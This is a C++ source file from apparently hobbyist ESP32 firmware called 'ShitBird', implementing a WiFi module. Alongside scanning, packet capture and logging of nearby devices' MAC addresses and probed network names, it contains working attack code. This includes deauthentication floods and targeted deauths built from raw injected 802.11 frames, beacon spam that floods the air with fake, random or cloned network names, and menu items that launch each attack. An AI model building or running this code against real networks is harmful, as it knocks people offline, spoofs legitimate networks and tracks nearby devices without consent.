/**
 * ShitBird Firmware - WiFi Module Implementation
 */

#include "wifi_module.h"
#include "../../core/system.h"
#include "../../core/storage.h"
#include "../../ui/ui_manager.h"
#include <esp_wifi.h>
#include <esp_wifi_types.h>

// Static member initialization
bool WiFiModule::initialized = false;
WiFiOpMode WiFiModule::currentMode = WiFiOpMode::IDLE;
WiFiAttackType WiFiModule::currentAttack = WiFiAttackType::NONE;

std::vector<APInfo> WiFiModule::accessPoints;
std::vector<ClientInfo> WiFiModule::clients;
std::vector<WiFiPacket> WiFiModule::capturedPackets;
std::vector<CapturedCredential> WiFiModule::credentials;
std::vector<String> WiFiModule::beaconSSIDs;

uint8_t WiFiModule::currentChannel = 1;
bool WiFiModule::channelHopping = false;
bool WiFiModule::monitoring = false;
bool WiFiModule::deauthing = false;
bool WiFiModule::beaconSpamming = false;
bool WiFiModule::pcapCapturing = false;
bool WiFiModule::handshakeCapturing = false;

uint32_t WiFiModule::deauthCount = 0;
uint32_t WiFiModule::beaconCount = 0;
uint32_t WiFiModule::packetCount = 0;

String WiFiModule::targetBSSID = "";
String WiFiModule::targetClientMAC = "";
String WiFiModule::pcapFilename = "";

TaskHandle_t WiFiModule::attackTaskHandle = nullptr;
TaskHandle_t WiFiModule::channelHopTaskHandle = nullptr;

// Rickroll SSIDs
const char* RICKROLL_SSIDS[] = {
    "Never gonna give you up",
    "Never gonna let you down",
    "Never gonna run around",
    "and desert you",
    "Never gonna make you cry",
    "Never gonna say goodbye",
    "Never gonna tell a lie",
    "and hurt you",
    "We're no strangers to love",
    "You know the rules",
    "and so do I",
    "A full commitment's",
    "what I'm thinking of"
};
const int RICKROLL_COUNT = sizeof(RICKROLL_SSIDS) / sizeof(RICKROLL_SSIDS[0]);

void WiFiModule::init() {
    if (initialized) return;

    Serial.println("[WIFI] Initializing...");

    // Initialize WiFi in station mode first
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();

    // Get MAC address
    uint8_t mac[6];
    esp_wifi_get_mac(WIFI_IF_STA, mac);
    Serial.printf("[WIFI] MAC: %s\n", macToString(mac).c_str());

    initialized = true;
    currentMode = WiFiOpMode::IDLE;

    Serial.println("[WIFI] Initialized");
}

void WiFiModule::update() {
    if (!initialized) return;

    // Update WiFi statistics
    // Prune old entries (not seen in 120 seconds)
    uint32_t now = millis();

    accessPoints.erase(
        std::remove_if(accessPoints.begin(), accessPoints.end(),
            [now](const APInfo& ap) { return (now - ap.lastSeen) > 120000; }),
        accessPoints.end()
    );

    clients.erase(
        std::remove_if(clients.begin(), clients.end(),
            [now](const ClientInfo& c) { return (now - c.lastSeen) > 120000; }),
        clients.end()
    );
}

void WiFiModule::deinit() {
    if (!initialized) return;

    stopScan();
    stopDeauth();
    stopBeaconSpam();
    stopMonitor();
    stopPcapCapture();

    WiFi.mode(WIFI_OFF);
    initialized = false;
}

// ============================================================================
// Scanning
// ============================================================================

void WiFiModule::startScan(bool passive) {
    if (currentMode != WiFiOpMode::IDLE) {
        stopScan();
    }

    Serial.println("[WIFI] Starting scan...");
    currentMode = WiFiOpMode::SCANNING;
    g_systemState.currentMode = OperationMode::WIFI_SCAN;

    // Use ESP-IDF scan for more control
    wifi_scan_config_t scanConfig = {
        .ssid = nullptr,
        .bssid = nullptr,
        .channel = 0,
        .show_hidden = true,
        .scan_type = passive ? WIFI_SCAN_TYPE_PASSIVE : WIFI_SCAN_TYPE_ACTIVE,
        .scan_time = {
            .active = { .min = 100, .max = 300 },
            .passive = 300
        }
    };

    esp_wifi_scan_start(&scanConfig, false);

    // Also enable monitor mode for client detection
    startMonitor();
    startChannelHop();

    Storage::log("wifi", "Scan started");
}

void WiFiModule::stopScan() {
    if (currentMode != WiFiOpMode::SCANNING) return;

    Serial.println("[WIFI] Stopping scan...");
    esp_wifi_scan_stop();
    stopChannelHop();
    stopMonitor();

    currentMode = WiFiOpMode::IDLE;
    if (g_systemState.currentMode == OperationMode::WIFI_SCAN) {
        g_systemState.currentMode = OperationMode::IDLE;
    }

    // Get scan results
    uint16_t apCount = 0;
    esp_wifi_scan_get_ap_num(&apCount);

    if (apCount > 0) {
        wifi_ap_record_t* apRecords = new wifi_ap_record_t[apCount];
        esp_wifi_scan_get_ap_records(&apCount, apRecords);

        for (int i = 0; i < apCount; i++) {
            APInfo ap;
            ap.ssid = (char*)apRecords[i].ssid;
            ap.bssid = macToString(apRecords[i].bssid);
            ap.rssi = apRecords[i].rssi;
            ap.channel = apRecords[i].primary;
            ap.encryption = apRecords[i].authmode;
            ap.isHidden = (ap.ssid.length() == 0);
            ap.lastSeen = millis();
            ap.selected = false;

            ap.hasWPA = (apRecords[i].authmode == WIFI_AUTH_WPA_PSK ||
                        apRecords[i].authmode == WIFI_AUTH_WPA_WPA2_PSK);
            ap.hasWPA2 = (apRecords[i].authmode == WIFI_AUTH_WPA2_PSK ||
                         apRecords[i].authmode == WIFI_AUTH_WPA_WPA2_PSK ||
                         apRecords[i].authmode == WIFI_AUTH_WPA2_ENTERPRISE);
            ap.hasWPA3 = (apRecords[i].authmode == WIFI_AUTH_WPA3_PSK);

            // Check if already exists
            bool found = false;
            for (auto& existing : accessPoints) {
                if (existing.bssid == ap.bssid) {
                    existing = ap;  // Update
                    found = true;
                    break;
                }
            }
            if (!found) {
                accessPoints.push_back(ap);
            }
        }

        delete[] apRecords;
    }

    Storage::logf("wifi", "Scan complete, found %d APs, %d clients",
                  accessPoints.size(), clients.size());
}

bool WiFiModule::isScanning() {
    return currentMode == WiFiOpMode::SCANNING;
}

std::vector<APInfo>& WiFiModule::getAccessPoints() {
    return accessPoints;
}

std::vector<ClientInfo>& WiFiModule::getClients() {
    return clients;
}

void WiFiModule::clearResults() {
    accessPoints.clear();
    clients.clear();
}

// ============================================================================
// Channel Management
// ============================================================================

void WiFiModule::setChannel(uint8_t channel) {
    if (channel < 1 || channel > 14) return;
    currentChannel = channel;
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
}

uint8_t WiFiModule::getChannel() {
    return currentChannel;
}

void WiFiModule::startChannelHop() {
    if (channelHopping) return;

    channelHopping = true;
    xTaskCreatePinnedToCore(
        channelHopTask,
        "WiFi_ChanHop",
        2048,
        nullptr,
        1,
        &channelHopTaskHandle,
        0
    );
}

void WiFiModule::stopChannelHop() {
    if (!channelHopping) return;

    channelHopping = false;
    if (channelHopTaskHandle) {
        vTaskDelete(channelHopTaskHandle);
        channelHopTaskHandle = nullptr;
    }
}

void WiFiModule::channelHopTask(void* param) {
    while (channelHopping) {
        for (uint8_t ch = 1; ch <= 13 && channelHopping; ch++) {
            setChannel(ch);
            vTaskDelay(pdMS_TO_TICKS(WIFI_CHANNEL_HOP_TIME));
        }
    }
    vTaskDelete(nullptr);
}

// ============================================================================
// Monitor Mode
// ============================================================================

void WiFiModule::startMonitor() {
    if (monitoring) return;

    Serial.println("[WIFI] Starting monitor mode...");

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(promiscuousCallback);
    esp_wifi_set_promiscuous(true);

    // Set filter to capture management and data frames
    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
    };
    esp_wifi_set_promiscuous_filter(&filter);

    monitoring = true;
}

void WiFiModule::stopMonitor() {
    if (!monitoring) return;

    Serial.println("[WIFI] Stopping monitor mode...");
    esp_wifi_set_promiscuous(false);
    monitoring = false;
}

bool WiFiModule::isMonitoring() {
    return monitoring;
}

void WiFiModule::promiscuousCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!monitoring) return;

    const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    const uint8_t* payload = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;

    packetCount++;

    // Write to PCAP if capturing
    if (pcapCapturing && !pcapFilename.isEmpty()) {
        writePcapPacket(pkt);
    }

    // Parse frame
    if (type == WIFI_PKT_MGMT) {
        parseManagementFrame(pkt);
    }
}

void WiFiModule::parseManagementFrame(const wifi_promiscuous_pkt_t* pkt) {
    const uint8_t* payload = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;
    int rssi = pkt->rx_ctrl.rssi;
    uint8_t channel = pkt->rx_ctrl.channel;

    if (len < 24) return;

    uint8_t frameType = payload[0] & 0xFC;

    switch (frameType) {
        case WIFI_MGMT_BEACON:
            parseBeacon(payload, len, rssi, channel);
            break;
        case WIFI_MGMT_PROBE_RESP:
            parseProbeResponse(payload, len, rssi);
            break;
        case WIFI_MGMT_PROBE_REQ:
            parseProbeRequest(payload, len, rssi);
            break;
        case WIFI_MGMT_DEAUTH:
        case WIFI_MGMT_DISASSOC:
            parseDeauth(payload, len);
            break;
    }
}

void WiFiModule::parseBeacon(const uint8_t* payload, int len, int rssi, uint8_t channel) {
    // Extract BSSID (bytes 16-21)
    String bssid = macToString(&payload[16]);

    // Check if we already have this AP
    for (auto& ap : accessPoints) {
        if (ap.bssid == bssid) {
            ap.lastSeen = millis();
            ap.rssi = rssi;
            return;
        }
    }

    // New AP - parse SSID from tagged parameters
    int tagStart = 36;  // After fixed parameters
    String ssid = "";

    while (tagStart < len - 2) {
        uint8_t tagNumber = payload[tagStart];
        uint8_t tagLength = payload[tagStart + 1];

        if (tagStart + 2 + tagLength > len) break;

        if (tagNumber == 0) {  // SSID
            ssid = String((char*)&payload[tagStart + 2], tagLength);
            break;
        }

        tagStart += 2 + tagLength;
    }

    APInfo ap;
    ap.ssid = ssid;
    ap.bssid = bssid;
    ap.rssi = rssi;
    ap.channel = channel;
    ap.encryption = WIFI_AUTH_OPEN;  // Will be updated by scan
    ap.isHidden = (ssid.length() == 0);
    ap.lastSeen = millis();
    ap.selected = false;

    accessPoints.push_back(ap);
}

void WiFiModule::parseProbeResponse(const uint8_t* payload, int len, int rssi) {
    // Similar to beacon parsing
    parseBeacon(payload, len, rssi, currentChannel);
}

void WiFiModule::parseProbeRequest(const uint8_t* payload, int len, int rssi) {
    if (len < 24) return;

    // Source MAC (transmitter)
    String clientMac = macToString(&payload[10]);

    // Find or create client entry
    ClientInfo* client = nullptr;
    for (auto& c : clients) {
        if (c.mac == clientMac) {
            client = &c;
            break;
        }
    }

    if (!client) {
        ClientInfo newClient;
        newClient.mac = clientMac;
        newClient.rssi = rssi;
        newClient.lastSeen = millis();
        newClient.probeCount = 0;
        newClient.selected = false;
        clients.push_back(newClient);
        client = &clients.back();
    }

    client->rssi = rssi;
    client->lastSeen = millis();
    client->probeCount++;

    // Extract probed SSID
    int tagStart = 24;
    while (tagStart < len - 2) {
        uint8_t tagNumber = payload[tagStart];
        uint8_t tagLength = payload[tagStart + 1];

        if (tagStart + 2 + tagLength > len) break;

        if (tagNumber == 0 && tagLength > 0) {  // SSID
            String ssid((char*)&payload[tagStart + 2], tagLength);
            bool found = false;
            for (const auto& s : client->probedSSIDs) {
                if (s == ssid) {
                    found = true;
                    break;
                }
            }
            if (!found && ssid.length() > 0) {
                client->probedSSIDs.push_back(ssid);
            }
            break;
        }

        tagStart += 2 + tagLength;
    }
}

void WiFiModule::parseDeauth(const uint8_t* payload, int len) {
    // Log deauth detection for detection mode
    g_systemState.deauthsSent++;  // Reusing counter for detected deauths
}

void WiFiModule::parseEAPOL(const uint8_t* payload, int len) {
    // EAPOL/handshake capture
    if (handshakeCapturing && len > 0) {
        // Store for handshake analysis
        WiFiPacket pkt;
        pkt.timestamp = millis();
        pkt.length = len;
        pkt.data.assign(payload, payload + len);
        capturedPackets.push_back(pkt);
    }
}

// ============================================================================
// Deauth Attacks
// ============================================================================

void WiFiModule::startDeauthFlood(const String& bssid) {
    if (deauthing) stopDeauth();

    Serial.printf("[WIFI] Starting deauth flood on %s\n", bssid.c_str());

    targetBSSID = bssid;
    targetClientMAC = "FF:FF:FF:FF:FF:FF";  // Broadcast
    deauthing = true;
    deauthCount = 0;
    currentAttack = WiFiAttackType::DEAUTH_FLOOD;
    g_systemState.currentMode = OperationMode::WIFI_ATTACK;

    // Find channel for target AP
    for (const auto& ap : accessPoints) {
        if (ap.bssid == bssid) {
            setChannel(ap.channel);
            break;
        }
    }

    xTaskCreatePinnedToCore(
        deauthTask,
        "WiFi_Deauth",
        4096,
        nullptr,
        2,
        &attackTaskHandle,
        1
    );

    Storage::logf("wifi", "Deauth flood started on %s", bssid.c_str());
}

void WiFiModule::startDeauthTargeted(const String& bssid, const String& clientMac) {
    if (deauthing) stopDeauth();

    Serial.printf("[WIFI] Starting targeted deauth: %s -> %s\n",
                  bssid.c_str(), clientMac.c_str());

    targetBSSID = bssid;
    targetClientMAC = clientMac;
    deauthing = true;
    deauthCount = 0;
    currentAttack = WiFiAttackType::DEAUTH_TARGETED;
    g_systemState.currentMode = OperationMode::WIFI_ATTACK;

    for (const auto& ap : accessPoints) {
        if (ap.bssid == bssid) {
            setChannel(ap.channel);
            break;
        }
    }

    xTaskCreatePinnedToCore(
        deauthTask,
        "WiFi_Deauth",
        4096,
        nullptr,
        2,
        &attackTaskHandle,
        1
    );

    Storage::logf("wifi", "Targeted deauth: %s -> %s", bssid.c_str(), clientMac.c_str());
}

void WiFiModule::startDeauthAll() {
    // Deauth all selected targets
    for (auto& ap : accessPoints) {
        if (ap.selected) {
            startDeauthFlood(ap.bssid);
            return;  // One at a time for now
        }
    }
}

void WiFiModule::stopDeauth() {
    if (!deauthing) return;

    Serial.println("[WIFI] Stopping deauth");
    deauthing = false;

    if (attackTaskHandle) {
        vTaskDelete(attackTaskHandle);
        attackTaskHandle = nullptr;
    }

    currentAttack = WiFiAttackType::NONE;
    if (g_systemState.currentMode == OperationMode::WIFI_ATTACK) {
        g_systemState.currentMode = OperationMode::IDLE;
    }

    Storage::logf("wifi", "Deauth stopped, sent %d packets", deauthCount);
}

bool WiFiModule::isDeauthing() {
    return deauthing;
}

uint32_t WiFiModule::getDeauthCount() {
    return deauthCount;
}

void WiFiModule::deauthTask(void* param) {
    uint8_t apMac[6], clientMac[6];
    stringToMac(targetBSSID, apMac);
    stringToMac(targetClientMAC, clientMac);

    while (deauthing) {
        // Send deauth from AP to client
        sendDeauthPacket(apMac, clientMac, DEAUTH_REASON_UNSPECIFIED);

        // Send deauth from client to AP (if not broadcast)
        if (targetClientMAC != "FF:FF:FF:FF:FF:FF") {
            sendDeauthPacket(clientMac, apMac, DEAUTH_REASON_LEAVING);
        }

        deauthCount++;
        g_systemState.deauthsSent = deauthCount;

        vTaskDelay(pdMS_TO_TICKS(g_systemState.settings.wifi.deauthInterval));
    }

    vTaskDelete(nullptr);
}

void WiFiModule::sendDeauthPacket(const uint8_t* ap, const uint8_t* client, uint16_t reason) {
    // 802.11 deauthentication frame
    uint8_t packet[26] = {
        0xC0, 0x00,                         // Frame control (deauth)
        0x00, 0x00,                         // Duration
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Destination (client)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (AP)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (AP)
        0x00, 0x00,                         // Sequence number
        0x01, 0x00                          // Reason code
    };

    // Fill addresses
    memcpy(&packet[4], client, 6);   // Destination
    memcpy(&packet[10], ap, 6);      // Source
    memcpy(&packet[16], ap, 6);      // BSSID

    // Reason code
    packet[24] = reason & 0xFF;
    packet[25] = (reason >> 8) & 0xFF;

    // Send using raw frame injection
    esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
}

// ============================================================================
// Beacon Spam
// ============================================================================

void WiFiModule::startBeaconSpam(const std::vector<String>& ssids) {
    if (beaconSpamming) stopBeaconSpam();

    Serial.printf("[WIFI] Starting beacon spam with %d SSIDs\n", ssids.size());

    beaconSSIDs = ssids;
    beaconSpamming = true;
    beaconCount = 0;
    currentAttack = WiFiAttackType::BEACON_SPAM_LIST;

    xTaskCreatePinnedToCore(
        beaconTask,
        "WiFi_Beacon",
        4096,
        nullptr,
        1,
        &attackTaskHandle,
        1
    );

    Storage::logf("wifi", "Beacon spam started, %d SSIDs", ssids.size());
}

void WiFiModule::startBeaconSpamRandom(uint8_t count) {
    std::vector<String> ssids;

    for (int i = 0; i < count; i++) {
        char ssid[33];
        int len = 8 + (esp_random() % 20);
        for (int j = 0; j < len; j++) {
            ssid[j] = 'a' + (esp_random() % 26);
        }
        ssid[len] = '\0';
        ssids.push_back(String(ssid));
    }

    currentAttack = WiFiAttackType::BEACON_SPAM_RANDOM;
    startBeaconSpam(ssids);
}

void WiFiModule::startBeaconClone() {
    std::vector<String> ssids;

    for (const auto& ap : accessPoints) {
        if (!ap.isHidden) {
            ssids.push_back(ap.ssid);
        }
    }

    if (ssids.empty()) {
        Serial.println("[WIFI] No APs to clone");
        return;
    }

    currentAttack = WiFiAttackType::BEACON_SPAM_CLONE;
    startBeaconSpam(ssids);
}

void WiFiModule::startRickrollBeacon() {
    std::vector<String> ssids;
    for (int i = 0; i < RICKROLL_COUNT; i++) {
        ssids.push_back(RICKROLL_SSIDS[i]);
    }

    currentAttack = WiFiAttackType::RICKROLL_BEACON;
    startBeaconSpam(ssids);
}

void WiFiModule::stopBeaconSpam() {
    if (!beaconSpamming) return;

    Serial.println("[WIFI] Stopping beacon spam");
    beaconSpamming = false;

    if (attackTaskHandle) {
        vTaskDelete(attackTaskHandle);
        attackTaskHandle = nullptr;
    }

    currentAttack = WiFiAttackType::NONE;
    Storage::logf("wifi", "Beacon spam stopped, sent %d beacons", beaconCount);
}

bool WiFiModule::isBeaconSpamming() {
    return beaconSpamming;
}

uint32_t WiFiModule::getBeaconCount() {
    return beaconCount;
}

void WiFiModule::beaconTask(void* param) {
    while (beaconSpamming) {
        for (const auto& ssid : beaconSSIDs) {
            if (!beaconSpamming) break;

            BeaconInfo beacon;
            beacon.ssid = ssid;

            // Random MAC
            for (int i = 0; i < 6; i++) {
                beacon.bssid[i] = esp_random() & 0xFF;
            }
            beacon.bssid[0] |= 0x02;  // Locally administered

            beacon.channel = currentChannel;
            beacon.hidden = false;
            beacon.auth = WIFI_AUTH_WPA2_PSK;

            sendBeaconPacket(beacon);
            beaconCount++;
            g_systemState.beaconsSent = beaconCount;

            vTaskDelay(pdMS_TO_TICKS(g_systemState.settings.wifi.beaconInterval));
        }
    }

    vTaskDelete(nullptr);
}

void WiFiModule::sendBeaconPacket(const BeaconInfo& beacon) {
    // Build beacon frame
    uint8_t packet[256];
    int len = 0;

    // Frame control
    packet[len++] = 0x80;  // Beacon
    packet[len++] = 0x00;

    // Duration
    packet[len++] = 0x00;
    packet[len++] = 0x00;

    // Destination (broadcast)
    memset(&packet[len], 0xFF, 6);
    len += 6;

    // Source (BSSID)
    memcpy(&packet[len], beacon.bssid, 6);
    len += 6;

    // BSSID
    memcpy(&packet[len], beacon.bssid, 6);
    len += 6;

    // Sequence number
    packet[len++] = 0x00;
    packet[len++] = 0x00;

    // Timestamp (8 bytes)
    uint64_t ts = esp_timer_get_time();
    memcpy(&packet[len], &ts, 8);
    len += 8;

    // Beacon interval
    packet[len++] = 0x64;  // 100 TUs
    packet[len++] = 0x00;

    // Capability info
    packet[len++] = 0x31;  // ESS, privacy
    packet[len++] = 0x04;

    // SSID tag
    packet[len++] = 0x00;  // Tag number
    packet[len++] = beacon.ssid.length();
    memcpy(&packet[len], beacon.ssid.c_str(), beacon.ssid.length());
    len += beacon.ssid.length();

    // Supported rates
    packet[len++] = 0x01;
    packet[len++] = 0x08;
    packet[len++] = 0x82; packet[len++] = 0x84;
    packet[len++] = 0x8B; packet[len++] = 0x96;
    packet[len++] = 0x24; packet[len++] = 0x30;
    packet[len++] = 0x48; packet[len++] = 0x6C;

    // Channel
    packet[len++] = 0x03;
    packet[len++] = 0x01;
    packet[len++] = beacon.channel;

    // Send frame
    esp_wifi_80211_tx(WIFI_IF_STA, packet, len, false);
}

// ============================================================================
// PCAP Capture
// ============================================================================

void WiFiModule::startPcapCapture(const char* filename) {
    if (pcapCapturing) stopPcapCapture();

    String path = String(PATH_PCAP) + "/" + filename;

    // Create PCAP file with header
    if (!Storage::createPcapFile(path.c_str(), PCAP_LINKTYPE_IEEE802_11)) {
        Serial.println("[WIFI] Failed to create PCAP file");
        return;
    }

    pcapFilename = path;
    pcapCapturing = true;
    packetCount = 0;

    Serial.printf("[WIFI] PCAP capture started: %s\n", path.c_str());
    Storage::logf("wifi", "PCAP capture started: %s", filename);
}

void WiFiModule::stopPcapCapture() {
    if (!pcapCapturing) return;

    pcapCapturing = false;
    pcapFilename = "";

    Serial.printf("[WIFI] PCAP capture stopped, %d packets\n", packetCount);
    Storage::logf("wifi", "PCAP stopped: %d packets", packetCount);
}

bool WiFiModule::isPcapCapturing() {
    return pcapCapturing;
}

uint32_t WiFiModule::getPcapPacketCount() {
    return packetCount;
}

void WiFiModule::writePcapPacket(const wifi_promiscuous_pkt_t* pkt) {
    if (!pcapCapturing || pcapFilename.isEmpty()) return;

    Storage::writePcapPacket(pcapFilename.c_str(), pkt->payload, pkt->rx_ctrl.sig_len);
}

// ============================================================================
// Utility Functions
// ============================================================================

String WiFiModule::macToString(const uint8_t* mac) {
    char str[18];
    snprintf(str, sizeof(str), "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return String(str);
}

void WiFiModule::stringToMac(const String& str, uint8_t* mac) {
    sscanf(str.c_str(), "%hhX:%hhX:%hhX:%hhX:%hhX:%hhX",
           &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
}

String WiFiModule::getEncryptionString(wifi_auth_mode_t auth) {
    switch (auth) {
        case WIFI_AUTH_OPEN: return "Open";
        case WIFI_AUTH_WEP: return "WEP";
        case WIFI_AUTH_WPA_PSK: return "WPA";
        case WIFI_AUTH_WPA2_PSK: return "WPA2";
        case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/WPA2";
        case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2-ENT";
        case WIFI_AUTH_WPA3_PSK: return "WPA3";
        default: return "Unknown";
    }
}

String WiFiModule::getVendor(const String& mac) {
    // TODO: Implement OUI lookup
    return "Unknown";
}

// ============================================================================
// Target Selection
// ============================================================================

void WiFiModule::selectAP(int index, bool selected) {
    if (index >= 0 && index < accessPoints.size()) {
        accessPoints[index].selected = selected;
    }
}

void WiFiModule::selectClient(int index, bool selected) {
    if (index >= 0 && index < clients.size()) {
        clients[index].selected = selected;
    }
}

void WiFiModule::selectAllAPs(bool selected) {
    for (auto& ap : accessPoints) {
        ap.selected = selected;
    }
}

void WiFiModule::clearSelection() {
    for (auto& ap : accessPoints) {
        ap.selected = false;
    }
    for (auto& c : clients) {
        c.selected = false;
    }
}

std::vector<APInfo*> WiFiModule::getSelectedAPs() {
    std::vector<APInfo*> selected;
    for (auto& ap : accessPoints) {
        if (ap.selected) {
            selected.push_back(&ap);
        }
    }
    return selected;
}

std::vector<ClientInfo*> WiFiModule::getSelectedClients() {
    std::vector<ClientInfo*> selected;
    for (auto& c : clients) {
        if (c.selected) {
            selected.push_back(&c);
        }
    }
    return selected;
}

// ============================================================================
// Menu Integration
// ============================================================================

void WiFiModule::buildMenu(void* menuPtr) {
    MenuScreen* menu = static_cast<MenuScreen*>(menuPtr);

    menu->addItem(MenuItem("Scan Networks", []() {
        WiFiModule::startScan();
        UIManager::showMessage("WiFi", "Scanning...", 1000);
    }));

    menu->addItem(MenuItem("Stop Scan", []() {
        WiFiModule::stopScan();
    }));

    menu->addItem(MenuItem("View APs", []() {
        auto& aps = WiFiModule::getAccessPoints();
        String msg = String(aps.size()) + " networks found";
        UIManager::showMessage("WiFi", msg);
    }));

    menu->addItem(MenuItem("Deauth Flood", []() {
        auto selected = WiFiModule::getSelectedAPs();
        if (selected.empty()) {
            UIManager::showMessage("Error", "Select a target first");
        } else {
            WiFiModule::startDeauthFlood(selected[0]->bssid);
            UIManager::showMessage("WiFi", "Deauth flood started");
        }
    }));

    menu->addItem(MenuItem("Stop Deauth", []() {
        WiFiModule::stopDeauth();
    }));

    menu->addItem(MenuItem("Beacon Spam", []() {
        WiFiModule::startBeaconSpamRandom(50);
        UIManager::showMessage("WiFi", "Beacon spam started");
    }));

    menu->addItem(MenuItem("Rickroll Beacon", []() {
        WiFiModule::startRickrollBeacon();
        UIManager::showMessage("WiFi", "Rickroll started");
    }));

    menu->addItem(MenuItem("Clone Networks", []() {
        WiFiModule::startBeaconClone();
        UIManager::showMessage("WiFi", "Cloning networks...");
    }));

    menu->addItem(MenuItem("Stop Beacon", []() {
        WiFiModule::stopBeaconSpam();
    }));

    menu->addItem(MenuItem("Start PCAP", []() {
        char filename[32];
        snprintf(filename, sizeof(filename), "capture_%lu.pcap", millis());
        WiFiModule::startPcapCapture(filename);
        UIManager::showMessage("PCAP", "Capture started");
    }));

    menu->addItem(MenuItem("Stop PCAP", []() {
        WiFiModule::stopPcapCapture();
    }));

    menu->addItem(MenuItem("< Back", nullptr));
    static_cast<MenuItem&>(menu->items.back()).type = MenuItemType::BACK;
}
